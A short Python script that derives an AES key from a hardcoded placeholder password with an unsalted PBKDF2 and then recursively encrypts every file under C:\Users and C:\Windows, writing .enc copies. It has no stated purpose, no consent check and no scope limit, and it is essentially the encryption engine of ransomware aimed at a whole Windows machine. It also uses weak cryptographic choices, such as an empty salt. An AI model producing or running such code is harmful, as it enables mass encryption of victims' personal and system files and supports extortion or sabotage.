import os
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend

# Configuration
PASSWORD = b'your-password-here'  # Replace with your password
ITERATIONS = 100000
KEY_LENGTH = 32  # 256 bits

def derive_key(password: bytes) -> bytes:
    # Using a fixed, empty salt for simplicity
    salt = b''  # No salt
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=KEY_LENGTH,
        salt=salt,
        iterations=ITERATIONS,
        backend=default_backend()
    )
    return kdf.derive(password)

def encrypt_file(file_path: str, password: bytes):
    try:
        key = derive_key(password)
        iv = os.urandom(16)  # Generate a random IV
        cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
        encryptor = cipher.encryptor()

        with open(file_path, 'rb') as f:
            data = f.read()

        encrypted_data = encryptor.update(data) + encryptor.finalize()

        with open(file_path + '.enc', 'wb') as f:
            f.write(iv + encrypted_data)  # Save IV with encrypted data

        print(f'Encrypted {file_path}')

    except (OSError, PermissionError) as e:
        print(f'Skipped {file_path} due to error: {e}')

def encrypt_directory(directory: str, password: bytes):
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(file_path, password)

if __name__ == '__main__':
    directories = [r'C:\Users', r'C:\Windows']
    for directory in directories:
        encrypt_directory(directory, PASSWORD)
